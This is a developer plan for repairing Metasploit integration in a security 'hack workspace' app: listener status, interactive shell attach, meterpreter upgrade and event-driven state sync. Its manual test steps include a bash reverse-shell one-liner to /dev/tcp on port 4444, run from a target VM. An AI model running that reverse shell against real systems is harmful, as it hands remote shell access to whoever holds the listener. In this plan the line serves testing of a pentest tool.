# Fix broken Metasploit listener / hack workspace

## Context

Hack workspace ships partial Metasploit wiring. Listener creation works, but
interactive shell, meterpreter upgrade, state hydration, listener status, and
session-upgrade store cleanup all dead. Symptoms: typing in shell tab does
nothing, "Upgrade to Meterpreter" button inert, footer stays "Disconnected"
after successful create, listener stuck on `waiting`, pre-existing
listeners/sessions invisible. Goal: make end-to-end flow (create listener →
incoming session → interactive shell → upgrade → meterpreter shell) actually
work and stay consistent across reconnects.

Out of scope (stretch — pending user decision): msfvenom-style payload
artifact generation/download.

## Root causes (mapped to fixes)

| #   | Bug                                                                                                                                             | Fix                                                                                                                                    |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | `activeMsfShellProcesses` never populated; `MetasploitShellAdapter.attach()` orphaned; `terminal.onData` is no-op; no `session.output` emission | Add `metasploitSessionAttach` RPC + emitter; wire web shell                                                                            |
| 2   | `sessionUpgrade()` hardcodes `LHOST=127.0.0.1`, `LPORT="0"`                                                                                     | Look up listener LHOST/LPORT by `session.listenerId` (or fall back to caller-supplied values)                                          |
| 3   | Upgrade button has no `onClick`                                                                                                                 | Wire to `rpcClient.metasploit.sessionUpgrade`                                                                                          |
| 4   | Store keeps old shell session after upgrade                                                                                                     | Emit `session.closed` for old id before `session.upgraded`; store already removes on `session.closed`                                  |
| 5   | `status()` doesn't auto-connect; pre-existing listeners/sessions invisible                                                                      | Auto-`ensureStarted` on `status()` and on `subscribeMetasploitEvents`; rebuild listener map from `job.list` on connect                 |
| 6   | Listener stuck `waiting`; no job polling                                                                                                        | Add job-poll loop alongside session poll, flip status to `active`/`stopped` based on `job.list` membership; emit listener update event |
| 7   | `connected` only set once                                                                                                                       | Add `connection.changed` event; update `setConnected` from event stream                                                                |
| 8   | Sessions discovered with `listenerId: null`                                                                                                     | Match by `via_exploit` payload ↔ listener payload + `tunnel_local` LHOST/LPORT to associate                                            |

## Files to modify

### Server

- `apps/server/src/metasploit/Layers/MetasploitService.ts`
  - L284–300 `status()`: yield `ensureStarted` (best-effort, swallow `MetasploitNotFoundError`).
  - L171–227 `startSessionPolling`: wire shell-output emission — keep adapter as the active path; service emits `session.opened/closed` only.
  - Add `startJobPolling` (every 2s, `client.call("job.list")`) → flip listener.status; emit new `listener.updated` event.
  - L188–198 session discovery: associate `listenerId` via via_exploit + tunnel match.
  - L454–538 `sessionUpgrade`: look up listener by `session.listenerId`, pass real LHOST/LPORT to `session.shell_upgrade`. Emit `session.closed` for old id when meterpreter id differs, before `session.upgraded`.
  - Hook into `ensureStarted` success/failure → emit new `connection.changed { connected: bool }`.
  - On `start`: call `job.list` + `session.list` once, hydrate `listeners`/`knownSessions` so prior msfrpcd state is visible.

- `apps/server/src/metasploit/Layers/MetasploitShellAdapter.ts`
  - Inject service event emitter (or new `onShellData(sessionId, cb)` hook on service). Currently service has no way to receive shell output for emission. Simplest: pass service's `emitEvent` (extend `MetasploitServiceShape` with `emitShellOutput(sessionId, data)`), or have ws layer wire dataCallbacks → service emit. Pick the latter (no service contract change): in adapter, expose `attach()` already returns process; ws layer subscribes `process.onData(d => metasploitService.emitSessionOutput(sessionId, d))`. Add minimal `emitSessionOutput(sessionId, data)` to service (emits `session.output`).

- `apps/server/src/metasploit/Services/MetasploitService.ts`
  - Extend `MetasploitServiceShape` with `emitSessionOutput(sessionId: string, data: string): Effect<void>`.

- `apps/server/src/ws.ts` (~L1110–1218)
  - Add RPC handler `metasploitSessionAttach(input: { sessionId })`:
    - Call `metasploitShellAdapter.attach(sessionId)`.
    - Wire `process.onData(d => metasploitService.emitSessionOutput(sessionId, d))`.
    - Wire `process.onExit()` → `activeMsfShellProcesses.delete(sessionId)`.
    - Store in `activeMsfShellProcesses`.
  - Add `metasploitSessionDetach(input: { sessionId })`: closes process, removes from map (don't kill MSF session).

- `apps/server/src/wsRpcGroup.ts` (or wherever `WS_METHODS`/RPC group defined — find via `metasploitSessionWrite` declaration): add `metasploitSessionAttach`, `metasploitSessionDetach`.

### Contracts

- `packages/contracts/src/metasploit.ts`
  - Add `SessionAttachInput { sessionId }`, `SessionAttachOutput { sessionId, attached: boolean }`.
  - Add `ListenerUpdatedEvent { type: "listener.updated", snapshot }` to `MetasploitEvent` union.
  - Add `ConnectionChangedEvent { type: "connection.changed", connected, version? }`.

- `packages/contracts/src/rpc.ts` (~L184–194): register new method names.

### Web

- `apps/web/src/rpc/wsRpcClient.ts` (~L65–76, ~L201–214): add `sessionAttach`, `sessionDetach` to `metasploit` namespace.

- `apps/web/src/components/hack/TargetShellTab.tsx`
  - L70–73: replace no-op `onData` with `rpcClient.metasploit.sessionWrite({ sessionId, data })`. Get `rpcClient` via existing context (check `useTargetAgent`/sibling for pattern).
  - In mount effect: call `rpcClient.metasploit.sessionAttach({ sessionId })`. On unmount: `sessionDetach`.
  - Wire `terminal.onResize` → `rpcClient.metasploit.sessionResize`.

- `apps/web/src/components/hack/TargetWorkspace.tsx`
  - L42–46: add `onClick={() => rpcClient.metasploit.sessionUpgrade({ sessionId })}` + pending state.

- `apps/web/src/metasploitStore.ts`
  - L80–86 `session.upgraded`: also delete old session if upgraded snapshot's id ≠ current active. (Backstop — server now also emits `session.closed` for old id, but defensive.)
  - Add cases for `listener.updated` (upsert) and `connection.changed` (call `setConnected`).

- `apps/web/src/components/hack/useMetasploitSync.ts`
  - L17–20: also handle `connection.changed` events updating `setConnected`.
  - Order calls so subscribe happens BEFORE `listListeners`/`listSessions` to avoid event-drop race.

## Reuse / existing utilities

- `MetasploitShellAdapter.attach()` already exists with polling + close detection — wire, don't rewrite. (`apps/server/src/metasploit/Layers/MetasploitShellAdapter.ts:32`)
- `emitEvent` PubSub already in place. (`MetasploitService.ts:103`)
- `metasploitSessionTerminalStore.appendOutput` already buffers `session.output`. (`apps/web/src/metasploitSessionTerminalStore.ts`)
- `useMetasploitSync.applyEvent` switch already covers session/listener events. Just add new event types.
- `observeRpcEffect` / `observeRpcStream` patterns at `ws.ts:1112`+ — copy for new attach RPCs.

## Verification

1. `bun fmt && bun lint && bun typecheck` clean.
2. Unit: extend `apps/server/src/server.test.ts` (mocks at L450) to cover new attach handler + shell-output emission.
3. Integration (manual, requires `msfrpcd` on PATH):
   - Start server, open hack workspace → footer flips to "Connected".
   - Pre-existing listeners/sessions render on load.
   - Create listener `linux/x86/meterpreter/reverse_tcp` LHOST `0.0.0.0` LPORT `4444`. Status `waiting` → `active` within 2s.
   - From target VM: `bash -c "bash -i >& /dev/tcp/<host>/4444 0>&1"` → session appears, listener associates `listenerId`.
   - Open shell tab → `id`, `whoami` → output streams.
   - Click "Upgrade to Meterpreter" → spinner → meterpreter session replaces shell (no duplicate).
   - Close session in msfconsole → UI session disappears.
4. Reconnect test: refresh browser mid-session → state rehydrates; shell reattach works (server reuses existing MSF session).

## Open question

Payload artifact generation (msfvenom) — included or deferred? Asked separately.
